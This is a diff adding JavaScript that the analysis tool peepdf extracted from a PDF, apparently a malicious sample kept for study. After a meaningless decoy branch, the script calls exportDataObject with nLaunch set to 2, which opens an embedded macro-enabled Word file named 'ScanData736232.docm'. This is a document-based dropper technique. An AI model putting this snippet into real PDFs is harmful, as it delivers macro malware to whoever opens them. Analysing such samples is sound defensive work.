@@ -1,0 +1,11 @@
+// peepdf comment: Javascript code located in object 12 (version 1)
+
+var a = 11;
+if (a > 50) {
+    alert(a);
+}
+this.exportDataObject({
+    cName: "ScanData736232.docm",
+    nLaunch: 2
+});
+
